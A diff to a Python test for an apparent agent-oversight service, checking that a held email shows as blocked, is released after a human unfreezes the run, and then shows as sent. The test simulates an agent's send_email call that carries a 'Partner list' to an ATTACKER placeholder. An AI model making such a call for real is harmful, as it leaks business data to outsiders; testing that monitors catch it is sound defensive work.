@@ -79,9 +79,14 @@ def test_a_released_email_shows_as_sent_and_the_incident_closes(monkeypatch):
     held = check(api, run_id, auth, "send_email", to=ATTACKER, subject="Partner list", body="x")
     assert panel(api, "outbox", "prod") == [("Partner list", "blocked")]
 
-    api.post(f"/runs/{run_id}/unfreeze", json=HUMAN)  # a human: false positive
-    api.post(f"/runs/{run_id}/tool-results", headers=auth,
-             json={"call_id": held.json()["call_id"], "tool": "send_email", "result": "sent"})
+    assert api.post(f"/runs/{run_id}/unfreeze", json=HUMAN).status_code == 200  # human: false positive
+    assert panel(api, "outbox", "prod") == [("Partner list", "blocked")]
+    released = api.get(f"/runs/{run_id}/wait", headers=auth,
+                       params={"timeout": 0, "call_id": held.json()["call_id"]})
+    assert released.status_code == 200 and released.json() == {"status": "running"}
+    assert api.post(f"/runs/{run_id}/tool-results", headers=auth,
+                    json={"call_id": held.json()["call_id"], "tool": "send_email", "result": "sent"}
+                    ).status_code == 204
     assert panel(api, "outbox", "prod") == [("Partner list", "normal")]  # it went out
     outbox = api.get("/services/outbox?env=prod").json()["items"]
     assert "sent after a human unfroze the run" in outbox[0]["subtitle"]
